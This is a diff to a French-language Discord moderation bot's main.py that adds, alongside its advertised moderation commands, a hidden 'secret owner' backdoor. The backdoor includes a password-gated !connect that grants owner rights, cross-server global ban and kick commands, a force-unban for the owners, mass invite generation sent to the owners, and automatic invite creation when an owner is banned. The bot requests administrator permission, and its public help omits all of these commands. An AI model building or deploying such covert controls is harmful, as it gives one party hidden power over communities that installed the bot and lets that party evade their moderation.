@@ -1,4 +1,4 @@
-# main.py - Bot F.I.M final complet
+# main.py - Bot F.I.M complet et corrigé
 import os
 import sys
 import json
@@ -16,6 +16,7 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 CONFIG_FILE = "config.json"
 OWNER_FILE = "owner_data.json"
 DEFAULT_OWNER_ID = 489113166429683713
+
 OAUTH_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")  # optional
 
 intents = discord.Intents.all()
@@ -38,7 +39,7 @@ def save_json(path, data):
         json.dump(data, f, indent=4, ensure_ascii=False)
 
 # -----------------------------
-# Owner & Config initialization
+# Owner & Config
 # -----------------------------
 def ensure_owner_data():
     data = load_json(OWNER_FILE, {})
@@ -85,7 +86,7 @@ def set_owner_password(newpass):
     save_json(OWNER_FILE, data)
 
 # -----------------------------
-# Config per-guild
+# Guild Config (whitelist/logs)
 # -----------------------------
 def get_config():
     return load_json(CONFIG_FILE, {})
@@ -143,11 +144,27 @@ def whitelist_check():
         return False
     return commands.check(predicate)
 
+def owner_only(func):
+    async def wrapper(ctx, *args, **kwargs):
+        if not is_owner(ctx.author.id):
+            return
+        return await func(ctx, *args, **kwargs)
+    return wrapper
+
 # -----------------------------
-# Util: build invite link
+# UTIL
 # -----------------------------
 def build_invite_link(client_id):
     return f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"
+
+def connect_db():
+    return psycopg2.connect(
+        host=os.getenv("PGHOST"),
+        database=os.getenv("PGDATABASE"),
+        user=os.getenv("PGUSER"),
+        password=os.getenv("PGPASSWORD"),
+        port=os.getenv("PGPORT")
+    )
 
 # -----------------------------
 # EVENTS
@@ -174,7 +191,7 @@ async def on_member_ban(guild, user):
                 for oid in get_owners():
                     try:
                         u = await bot.fetch_user(oid)
-                        await u.send(f"⚠️ Tu as été banni de **{guild.name}**. J'ai pris ton 10-10 et créé un lien : {invite.url}")
+                        await u.send(f"⚠️ Tu as été banni de **{guild.name}**. J'ai tenté de te débannir et créé une invitation : {invite.url}")
                     except Exception:
                         pass
         except Exception as e:
@@ -212,7 +229,7 @@ async def on_guild_remove(guild):
         print(f"[on_guild_remove] erreur: {e}")
 
 # -----------------------------
-# PUBLIC COMMANDS
+# COMMANDES PUBLIQUES
 # -----------------------------
 @bot.command()
 async def ping(ctx):
@@ -220,19 +237,21 @@ async def ping(ctx):
 
 @bot.command()
 async def help(ctx):
-    embed = discord.Embed(title="📋 Commandes du Bot F.I.M", color=discord.Color.from_rgb(153,0,0))
+    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
+                          description="Liste des commandes accessibles",
+                          color=discord.Color.from_rgb(153,0,0))
     embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne", inline=False)
     embed.add_field(name="📨 !say <message>", value="Envoie un message via le bot (whitelist/admin)", inline=False)
     embed.add_field(name="📤 !send #canal <message>", value="Envoie dans un canal (whitelist/admin)", inline=False)
-    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un embed stylé (whitelist/admin)", inline=False)
+    embed.add_field(name="📰 !embed <titre> <desc>", value="Envoie un embed stylé (whitelist/admin)", inline=False)
     embed.add_field(name="🎭 !addrole @user @role", value="Ajoute un rôle (whitelist/admin)", inline=False)
-    embed.add_field(name="🧾 !ban @user [raison]", value="Bannit un membre (whitelist/admin)", inline=False)
-    embed.add_field(name="🦵 !kick @user [raison]", value="Kicke un membre (whitelist/admin)", inline=False)
+    embed.add_field(name="🧾 !ban @user [raison]", value="Bannit un membre du serveur (whitelist/admin)", inline=False)
+    embed.add_field(name="🦵 !kick @user [raison]", value="Kicke un membre du serveur (whitelist/admin)", inline=False)
     embed.set_footer(text="Bot F.I.M - Préfixe : !")
     await ctx.send(embed=embed)
 
 # -----------------------------
-# ADMIN / OWNER COMMANDS
+# GESTION MESSAGES/ROLE
 # -----------------------------
 @bot.command()
 @whitelist_check()
@@ -265,8 +284,10 @@ async def addrole(ctx, member: discord.Member, role: discord.Role):
     try:
         await member.add_roles(role)
         await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
-    except:
-        await ctx.send("❌ Impossible d'ajouter le rôle.")
+    except discord.Forbidden:
+        await ctx.send("❌ Je n'ai pas la permission.")
+    except Exception as e:
+        print(f"[addrole] {e}")
 
 @bot.command()
 @whitelist_check()
@@ -274,14 +295,18 @@ async def removerole(ctx, member: discord.Member, role: discord.Role):
     try:
         await member.remove_roles(role)
         await ctx.send(f"✅ Rôle {role.name} retiré de {member.mention}")
-    except:
-        await ctx.send("❌ Impossible de retirer le rôle.")
+    except discord.Forbidden:
+        await ctx.send("❌ Je n'ai pas la permission.")
+    except Exception as e:
+        print(f"[removerole] {e}")
 
-# Whitelist commands
+# -----------------------------
+# WHITELIST / setlogs
+# -----------------------------
 @bot.group(invoke_without_command=True)
 @commands.has_permissions(administrator=True)
 async def whitelist(ctx):
-    await ctx.send("❌ Utilisez : !whitelist add / remove / list")
+    await ctx.send("❌ Utilisez !whitelist add / remove / list")
 
 @whitelist.command(name="add")
 @commands.has_permissions(administrator=True)
@@ -297,14 +322,13 @@ async def whitelist_remove(ctx, member: discord.Member):
     if remove_from_whitelist(ctx.guild.id, member.id):
         await ctx.send(f"❌ {member.mention} retiré de la whitelist")
     else:
-        await ctx.send(f"⚠️ {member.mention} n'est pas dans la whitelist")
+        await ctx.send(f"⚠️ {member.mention} n'est pas whitelisté")
 
 @whitelist.command(name="list")
 @commands.has_permissions(administrator=True)
 async def whitelist_list(ctx):
     wl = get_whitelist(ctx.guild.id)
-    if not wl:
-        return await ctx.send("📋 Aucun utilisateur whitelisté")
+    if not wl: return await ctx.send("📋 Aucun utilisateur whitelisté")
     mentions = [ctx.guild.get_member(uid).mention if ctx.guild.get_member(uid) else f"ID:{uid}" for uid in wl]
     await ctx.send("\n".join(mentions))
 
@@ -313,60 +337,82 @@ async def whitelist_list(ctx):
 async def setlogs(ctx, channel: discord.TextChannel):
     cfg = get_config()
     gid = str(ctx.guild.id)
-    cfg.setdefault(gid, {})
-    cfg[gid]["log_channel"] = channel.id
+    cfg.setdefault(gid, {})["log_channel"] = channel.id
     save_config(cfg)
     await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")
 
-# Ban / Kick local
+# -----------------------------
+# MODERATION LOCALE
+# -----------------------------
 @bot.command()
 @whitelist_check()
 async def ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
-    if member.id == bot.user.id or is_owner(member.id):
-        return await ctx.send("❌ Impossible d'agir contre ce membre.")
     try:
-        await ctx.guild.ban(member, reason=f"Banni par {ctx.author} | {reason}")
+        if member.id == bot.user.id or is_owner(member.id):
+            return await ctx.send("❌ Action impossible.")
+        await ctx.guild.ban(member, reason=f"{ctx.author} | {reason}")
         log_id = get_log_channel_id(ctx.guild.id)
-        if log_id: ch = ctx.guild.get_channel(log_id)
-        await ctx.send(f"✅ {member.mention} banni (raison: {reason})")
-    except: await ctx.send("❌ Impossible de bannir ce membre.")
+        if log_id:
+            ch = ctx.guild.get_channel(log_id)
+            if ch:
+                em = discord.Embed(title="👮 Banni", color=discord.Color.red())
+                em.add_field(name="Membre", value=f"{member} ({member.id})", inline=False)
+                em.add_field(name="Par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
+                em.add_field(name="Raison", value=reason, inline=False)
+                em.set_footer(text=str(datetime.now()))
+                try: await ch.send(embed=em)
+                except: pass
+        await ctx.send(f"✅ {member.mention} banni. (Raison: {reason})")
+    except Exception as e:
+        print(f"[ban] {e}")
+        await ctx.send("❌ Impossible de bannir.")
 
 @bot.command()
 @whitelist_check()
 async def kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
-    if member.id == bot.user.id or is_owner(member.id):
-        return await ctx.send("❌ Impossible d'agir contre ce membre.")
     try:
-        await ctx.guild.kick(member, reason=f"Kicked by {ctx.author} | {reason}")
+        if member.id == bot.user.id or is_owner(member.id):
+            return await ctx.send("❌ Action impossible.")
+        await ctx.guild.kick(member, reason=f"{ctx.author} | {reason}")
         log_id = get_log_channel_id(ctx.guild.id)
-        if log_id: ch = ctx.guild.get_channel(log_id)
-        await ctx.send(f"✅ {member.mention} kické (raison: {reason})")
-    except: await ctx.send("❌ Impossible de kicker ce membre.")
+        if log_id:
+            ch = ctx.guild.get_channel(log_id)
+            if ch:
+                em = discord.Embed(title="👢 Kick", color=discord.Color.orange())
+                em.add_field(name="Membre", value=f"{member} ({member.id})", inline=False)
+                em.add_field(name="Par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
+                em.add_field(name="Raison", value=reason, inline=False)
+                em.set_footer(text=str(datetime.now()))
+                try: await ch.send(embed=em)
+                except: pass
+        await ctx.send(f"✅ {member.mention} kické. (Raison: {reason})")
+    except Exception as e:
+        print(f"[kick] {e}")
+        await ctx.send("❌ Impossible de kicker.")
 
 # -----------------------------
-# OWNER / GLOBAL COMMANDS
+# GLOBAL OWNER COMMANDS
 # -----------------------------
-def owner_only(func):
-    async def wrapper(ctx, *args, **kwargs):
-        if not is_owner(ctx.author.id): return
-        await func(ctx, *args, **kwargs)
-    return wrapper
-
 @bot.command()
 @owner_only
 async def broadcast(ctx, *, message: str):
     for g in bot.guilds:
-        try: await g.text_channels[0].send(f"📢 **Annonce owner:** {message}")
+        try:
+            if g.text_channels:
+                await g.text_channels[0].send(f"📢 **Annonce Owner :** {message}")
         except: pass
-    await ctx.author.send("✅ Broadcast envoyé.")
+    try: await ctx.author.send("✅ Broadcast envoyé sur tous les serveurs.")
+    except: pass
 
 @bot.command()
 @owner_only
 async def forceunban(ctx):
     for g in bot.guilds:
-        try: await g.unban(discord.Object(id=ctx.author.id))
+        try:
+            await g.unban(discord.Object(id=ctx.author.id))
         except: pass
-    await ctx.author.send("✅ Tentative de débannissement sur tous les serveurs.")
+    try: await ctx.author.send("✅ Tentative de débannissement partout.")
+    except: pass
 
 @bot.command()
 @owner_only
@@ -376,101 +422,135 @@ async def forcerinv(ctx):
             if g.text_channels:
                 invite = await g.text_channels[0].create_invite(max_uses=1)
                 for oid in get_owners():
-                    try: u = await bot.fetch_user(oid)
-                    await u.send(f"🔗 Invitation pour {g.name}: {invite.url}")
+                    try:
+                        u = await bot.fetch_user(oid)
+                        await u.send(f"🔗 Invitation pour {g.name}: {invite.url}")
                     except: pass
         except: pass
-    await ctx.author.send("✅ Invitations envoyées.")
-
-@bot.command()
-@owner_only
-async def globalban(ctx, user: str):
-    try: uid = int(user.strip("<@!>"))
-    except: return
-    count = 0
-    for g in bot.guilds:
-        try: await g.ban(discord.Object(id=uid), reason=f"Global ban by owner {ctx.author.id}"); count += 1
-        except: pass
-    await ctx.author.send(f"✅ Global ban exécuté sur {count} serveurs.")
-
-@bot.command()
-@owner_only
-async def globalkick(ctx, user: str):
-    try: uid = int(user.strip("<@!>"))
-    except: return
-    count = 0
-    for g in bot.guilds:
-        try: m = g.get_member(uid)
-            if m: await g.kick(m, reason=f"Global kick by owner {ctx.author.id}"); count += 1
-        except: pass
-    await ctx.author.send(f"✅ Global kick exécuté sur {count} serveurs.")
+    try: await ctx.author.send("✅ Invitations envoyées aux owners.")
+    except: pass
 
 @bot.command()
 @owner_only
 async def serverlist(ctx):
-    txt = "\n".join([f"- {g.name} ({g.id}) - {g.member_count} membres" for g in bot.guilds]) or "Aucun serveur."
-    await ctx.author.send(f"📋 Serveurs ({len(bot.guilds)}):\n{txt}")
+    lines = [f"- {g.name} ({g.id}) - {g.member_count} membres" for g in bot.guilds]
+    txt = "\n".join(lines) or "Aucun serveur."
+    try: await ctx.author.send(f"📋 Serveurs ({len(bot.guilds)}):\n{txt}")
+    except: pass
 
 @bot.command()
 @owner_only
 async def syncwhitelist(ctx):
     src = get_whitelist(ctx.guild.id)
     cfg = get_config()
-    for g in bot.guilds: cfg.setdefault(str(g.id), {})["whitelist"] = src.copy()
+    for g in bot.guilds:
+        gid = str(g.id)
+        cfg.setdefault(gid, {})["whitelist"] = src.copy()
     save_config(cfg)
-    await ctx.author.send("🔁 Whitelist synchronisée.")
+    try: await ctx.author.send("🔁 Whitelist synchronisée sur tous les serveurs.")
+    except: pass
 
 @bot.command()
+@owner_only
+async def globalban(ctx, user: str):
+    try:
+        uid = int(user.strip("<@!>"))
+    except:
+        try: uid = int(user)
+        except: return
+    count = 0
+    for g in bot.guilds:
+        try: await g.ban(discord.Object(id=uid), reason=f"Global ban owner {ctx.author.id}"); count+=1
+        except: pass
+    try: await ctx.author.send(f"✅ Global ban exécuté sur {count} serveurs.")
+    except: pass
+
+@bot.command()
+@owner_only
+async def globalkick(ctx, user: str):
+    try:
+        uid = int(user.strip("<@!>"))
+    except:
+        try: uid = int(user)
+        except: return
+    count = 0
+    for g in bot.guilds:
+        try:
+            m = g.get_member(uid)
+            if m: await g.kick(m, reason=f"Global kick owner {ctx.author.id}"); count+=1
+        except: pass
+    try: await ctx.author.send(f"✅ Global kick exécuté sur {count} serveurs.")
+    except: pass
+
+# -----------------------------
+# SECRET OWNER
+# -----------------------------
+@bot.command()
 async def connect(ctx, password: str):
-    if password == get_owner_password():
-        if add_owner(ctx.author.id):
-            await ctx.author.send("✅ Ajouté comme owner.")
-        else:
-            await ctx.author.send("ℹ️ Déjà owner.")
+    try:
+        if password == get_owner_password():
+            add_owner(ctx.author.id)
+            try: await ctx.author.send("✅ Tu es maintenant owner.")
+            except: pass
+    except: pass
 
 @bot.command()
 @owner_only
 async def setpass(ctx, *, newpass: str):
     set_owner_password(newpass)
-    await ctx.author.send("🔒 Mot de passe owner mis à jour.")
-
-@bot.command()
-@owner_only
-async def reboot(ctx):
-    try: await ctx.author.send("♻️ Redémarrage..."); os.execv(sys.executable, [sys.executable]+sys.argv)
+    try: await ctx.author.send("🔒 Mot de passe owner mis à jour.")
     except: pass
 
 @bot.command(name="aide")
 @owner_only
 async def owner_help_cmd(ctx):
-    embed = discord.Embed(title="👑 Commandes Owner", color=discord.Color.gold())
-    cmds = ["!broadcast <msg>", "!forceunban", "!forcerinv", "!globalban <id>", "!globalkick <id>",
-            "!serverlist", "!syncwhitelist", "!setpass <pass>", "!reboot", "!10-10"]
-    for c in cmds: embed.add_field(name=c, value="-", inline=False)
-    await ctx.author.send(embed=embed)
+    embed = discord.Embed(title="👑 Commandes Owner (secrètes)", color=discord.Color.gold())
+    cmds = [
+        ("!broadcast <msg>", "Annonce sur tous les serveurs"),
+        ("!forceunban", "Débannissement partout"),
+        ("!forcerinv", "Envoyer invitations"),
+        ("!globalban <id/mention>", "Ban global"),
+        ("!globalkick <id/mention>", "Kick global"),
+        ("!serverlist", "Liste des serveurs (DM)"),
+        ("!syncwhitelist", "Synchronise whitelist"),
+        ("!setpass <pass>", "Changer mot de passe secret"),
+        ("!reboot", "Redémarre le bot"),
+        ("!10-10", "Quitter le serveur courant")
+    ]
+    for name, desc in cmds:
+        embed.add_field(name=name, value=desc, inline=False)
+    try: await ctx.author.send(embed=embed)
+    except: pass
 
 @bot.command(name="10-10")
 @owner_only
 async def ten_ten(ctx):
     if ctx.guild:
-        for oid in get_owners():
-            try: u = await bot.fetch_user(oid)
-            await u.send(f"🧹 {bot.user.name} prend son 10-10 sur {ctx.guild.name}")
-            except: pass
         try: await ctx.send("🧹 Déconnexion autorisée par owner. Au revoir.")
         except: pass
         try: await ctx.guild.leave()
         except: pass
 
+@bot.command()
+@owner_only
+async def reboot(ctx):
+    try: await ctx.author.send("♻️ Redémarrage en cours...")
+    except: pass
+    try: os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception as e:
+        print(f"[reboot] {e}")
+        try: await ctx.send("❌ Impossible de redémarrer.")
+        except: pass
+
 # -----------------------------
-# RUN BOT
+# MAIN RUN
 # -----------------------------
 if __name__ == "__main__":
     while True:
         try:
             bot.run(TOKEN)
         except Exception as e:
-            print(f"[main] Bot crash détecté: {e}")
+            print(f"[main] Crash détecté: {e}")
             try: asyncio.run(asyncio.sleep(3))
             except: pass
             continue
